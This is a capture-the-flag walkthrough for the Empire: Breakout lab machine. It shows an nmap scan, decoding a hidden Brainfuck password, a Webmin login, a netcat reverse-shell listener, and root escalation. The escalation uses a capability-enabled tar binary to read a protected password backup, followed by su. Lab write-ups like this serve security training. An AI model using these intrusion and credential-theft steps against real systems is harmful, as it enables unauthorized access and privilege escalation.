# EMPIRE:BREAKOUT-CTF

nmap scan 

```bash
──(root㉿kali)-[~]
└─# nmap -sV -p- -sC 192.168.29.250 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-02 09:05 IST
Nmap scan report for 192.168.29.250
Host is up (0.00055s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.51 (Debian)
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
MAC Address: 08:00:27:EB:0C:11 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-02T03:35:30
|_  start_date: N/A
|_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.46 seconds

```

we got this page by opening the port 80

![image.png](EMPIRE%20BREAKOUT-CTF/image.png)

so after some digging on this page we got the cipher text in view page source

![image.png](EMPIRE%20BREAKOUT-CTF/image%201.png)

Now , we will convert this cipher in to plain text

[https://www.dcode.fr/cipher-identifier](https://www.dcode.fr/cipher-identifier)

![lets decode this code](EMPIRE%20BREAKOUT-CTF/image%202.png)

lets decode this code

Brainfuck

[https://stuff.splitbrain.org/ook/](https://stuff.splitbrain.org/ook/)

Decoded text : `.2uqPEfj3D<P'a-3`

![web2.png](EMPIRE%20BREAKOUT-CTF/web2.png)

Login Credential

```bash
user: cyber (random guess)
Pass: .2uqPEfj3D<P'a-3
```

![image.png](EMPIRE%20BREAKOUT-CTF/image%203.png)

 open command shell and start reverse shell connection :

![image.png](EMPIRE%20BREAKOUT-CTF/image%204.png)

And Start listener on your attack box

```bash
┌──(root㉿kali)-[~]
└─# nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.29.219] from (UNKNOWN) [192.168.29.250] 59106
```

Now spawn a bash tty shell using this command

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation

```bash
cyber@breakout:~$ getcap -r / 2>/dev/null
getcap -r / 2>/dev/null
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
cyber@breakout:~$ 
```

There is a binary `tar` located in the folder `/home/cyber`, which can be used to reveal the contents of the restricted files.

Upon checking the folders there is a old password file exists in the `backups` folder.

```bash
cyber@breakout:~$ cd /var/backups
cd /var/backups
```

lets check the file in backups

```bash
cyber@breakout:/var/backups$ ls -la
ls -la
total 12
drwxr-xr-x  2 root root 4096 Oct 20  2021 .
drwxr-xr-x 14 root root 4096 Oct 19  2021 ..
-rw-------  1 root root   17 Oct 20  2021 .old_pass.bak

```

We got a suspicious file name  `.old_pass.bak`

Now Lets unzip this file 

```bash
cyber@breakout:/$ /home/cyber/tar -cf - /var/backups/.old_pass.bak | /bin/tar -xOf -
< -cf - /var/backups/.old_pass.bak | /bin/tar -xOf -
/home/cyber/tar: Removing leading `/' from member names
Ts&4&YurgtRX(=~h

```

And we got the root password :  `Ts&4&YurgtRX(=~h`

Now , Lets Login as Root 

```bash
cyber@breakout:/$ su root
su root
Password: Ts&4&YurgtRX(=~h
root@breakout:/# whoami
whoami
root
root@breakout:/# 

```